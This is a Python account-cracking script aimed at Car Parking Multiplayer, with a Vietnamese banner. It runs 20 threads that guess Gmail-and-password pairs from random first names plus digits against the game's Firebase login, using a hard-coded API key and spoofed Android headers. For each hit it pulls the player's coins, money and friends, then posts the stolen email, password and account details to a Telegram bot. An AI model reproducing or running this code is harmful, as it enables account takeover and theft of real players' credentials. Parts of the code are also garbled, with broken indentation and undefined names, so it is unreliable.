import requests
import json
import datetime
import random
import threading
import os

try:
    from colorama import Fore
except:
    os.system('pip install colorama')
    from colorama import Fore

try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    from cfonts import render, say

try:
    from names import get_first_name
except:
    os.system('pip install names')
    from names import get_first_name
    
def banner(console):
    os.system('cls' if os.name == 'nt' else 'clear')
    brand_name =  "        ░█████╗░░░░██████╗░░░░██╗░░██╗░░░░░███╗░░\n"
    brand_name += "        ██╔══██╗░░░██╔══██╗░░░██║░██╔╝░░░░████║░░\n"
    brand_name += "        ██║░░╚═╝░░░██████╔╝░░░█████═╝░░░░██╔██║░░\n"
    brand_name += "        ██║░░██╗░░░██╔═══╝░░░░██╔═██╗░░░░╚═╝██║░░\n"
    brand_name += "        ╚█████╔╝░░░██║░░░░░░░░██║░╚██╗░░░███████╗\n"
    brand_name += "        ░╚════╝░░░░╚═╝░░░░░░░░╚═╝░░╚═╝░░░╚══════╝\n"
    colors = [
        "rgb(255,0,0)", "rgb(255,69,0)", "rgb(255,140,0)", "rgb(255,215,0)", "rgb(173,255,47)", 
        "rgb(0,255,0)", "rgb(0,255,255)", "rgb(0,191,255)", "rgb(0,0,255)", "rgb(139,0,255)",
        "rgb(255,0,255)"
    ]
    colorful_text = gradient_text(brand_name, colors)
    console.print(colorful_text)
    console.print("[bold yellow]      ♕ CPKVN[/bold yellow][bold red]: Car Parking 1 Hacking Tool VietNames.[/bold red]")
    console.print("[bold yellow]   ==================================================[/bold yellow]")
    console.print("[bold red]    《 Lưu ý:[/bold red][bold red]: Đăng xuất tài khoản trước khi hack 》", end="\n\n")

headers = {
    "Content-Type": "application/json",
    "X-Android-Package": "com.olzhas.carparking.multyplayer",
    "X-Android-Cert": "D4962F8124C2E09A66B97C8E326AFF805489FE39",
    "Accept-Language": "tr-TR, en-US",
    "X-Client-Version": "Android/Fallback/X22001001/FirebaseCore-Android",
    "X-Firebase-GMPID": "1:581727203278:android:af6b7dee042c8df539459f",
    "X-Firebase-Client": "H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; A5010 Build/PI)",
    "Host": "www.googleapis.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
}

def prompt_valid_value(content, tag, password=False):
    while True:
        value = Prompt.ask(content, password=password)
        if not value or value.isspace():
            console.print(f"[bold red]   ⚠ {tag} Không thể để trống, hãy thử lại ⚠[/bold red]")
        else:
            return value

        TOKEN = prompt_valid_value("[bold yellow]   Token bot   : [/bold yellow]", "TOKENl", password=False)
        ID = prompt_valid_value("[bold yellow]   Id tài khoản   : [/bold yellow]", "IDl", password=False)
    console.print("[bold #00dcff]   [%] Đang đăng nhập[/bold #00dcff]: ", end=None)
login_response = CPM.login(acc_email, acc_password)
if login_response != 0:
            if login_response == 100:
                console.print("[bold red]Không tìm thấy token[/bold red].")
                sleep(2)
                continue
            elif login_response == 101:
                console.print("[bold red]Sai ID[/bold red].")
                sleep(2)
                continue
            else:
                console.print("[bold red]Hãy thử lại[/bold red].")
                console.print("[bold yellow]⚠ Note: Hãy chắc chắn rằng bạn đã điền đầy đủ ⚠[/bold yellow]")
                sleep(2)
                continue
        else:
            console.print("[bold green]Đã thành công[/bold green].")

def decode_nested_json(d):
    for key, value in d.items():
        if isinstance(value, str):
            try:
                nested_value = json.loads(value)
                d[key] = decode_nested_json(nested_value)
            except json.JSONDecodeError:
                continue
        elif isinstance(value, dict):
            d[key] = decode_nested_json(value)
    return d

def login(email,password):
    data = {
        "email": email,
        "password": password,
        "returnSecureToken": True,
        "clientType": "CLIENT_TYPE_ANDROID"
    }
    res = requests.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", json=data, headers=headers).json()
    if "idToken" in res:
        tkn = res["idToken"]
        data2 = {
            "idToken": tkn
        }
        res2 = requests.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", json=data2, headers=headers).json()
        deta=res2['users'][0]['createdAt']
        data3 = {
            "data": "2893216D41959108CB8FA08951CB319B7AD80D02"
        }
        he = {
            "authorization": f"Bearer {tkn}",
            "firebase-instance-id-token": "f0Rstd-MTbydQx9M2eLlTM:APA91bF7UdxnXLAaybpBODKCRnyLu44eFWygoIfnLn7kOE9aujlb5WcvTv-EyA5mTNbVBPQ-r-x967XJqEA3TX23gGyXCSbMEEa2PIccvNU98uEcdun1qMgYbCOY4hPBBD2w6G9mfX_m",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.12.13"
        }
        info = requests.post("https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2", json=data3, headers=he).text

        data_account = json.loads(info)
        if 'result' in data_account:data_account['result'] = decode_nested_json(json.loads(data_account['result']))

        result_account = data_account["result"]
        try:Player_name = result_account['Name']
        except:Player_name = 'None'
        try:Friends_count = len(result_account['FriendsID'])
        except:Friends_count = 'None'
        try:Coins = result_account['coin']
        except:Coins = 'None'
        try:Money = result_account['money']
        except:Money = 'None'
        Date_Account = str(datetime.datetime.fromtimestamp(int(deta) / 1000)).split(' ')[0].replace('-', '/')
        msg_text = f'''*~ Car Parking 🚘*\n*———————————*\n*Email : *`{email}`\n*Password : *`{password}`\n*——*\n*Name : {Player_name} 👤*\n*Coins : {Coins} 🪙*\n*Money : {Money} 💰*\n*Friends : {Friends_count} 👥*\n*Date : {Date_Account} ⌛️*\n*———————————*\n*By @Lê Quyền Ngự *'''
        try:
            url = (f'https://api.telegram.org/bot{token}/sendMessage')
            payload = {'chat_id': str(ID), 'text': msg_text, 'parse_mode': 'markdown'}
            requests.post(url, params=payload)
        except:''
        print(f"[{Fore.LIGHTGREEN_EX}√{Fore.RESET}] Good : {email}:{password}")

    else:
        print(f"[{Fore.LIGHTRED_EX}×{Fore.RESET}] Bad : {email}:{password}")
def RunChk():
    while True:
        names = str(get_first_name())
        numbers1 = ''.join(random.choices('1234567890', k=random.randint(1,5)))
        password = names+numbers1
        email = f'{names}{numbers1}@gmail.com'
        login(email,password)
E_TREADING=[]
for i in range(20):
    t = threading.Thread(target=login and RunChk)
    t.start()
    E_TREADING.append(t)
RunChk()